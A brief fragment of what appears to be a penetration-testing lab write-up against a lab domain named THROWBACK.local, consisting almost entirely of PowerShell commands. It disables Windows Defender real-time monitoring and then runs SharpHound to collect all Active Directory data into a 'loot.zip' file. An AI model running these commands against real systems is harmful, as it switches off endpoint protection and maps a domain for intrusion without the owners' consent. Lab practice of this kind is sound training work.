...
```
let's shutdown `windows defender`
```
...
PS C:\Users\BlaireJ\Downloads> Set-MpPreference -DisableRealtimeMoni
toring $true
PS C:\Users\BlaireJ\Downloads> Get-MpComputerStatus
...
```
PS C:\Users\BlaireJ\Downloads> Import-Module .\Sharphound.ps1
PS C:\Users\BlaireJ\Downloads> Invoke-Bloodhound -CollectionMethod A
ll -Domain THROWBACK.local -ZipFileName loot.zip
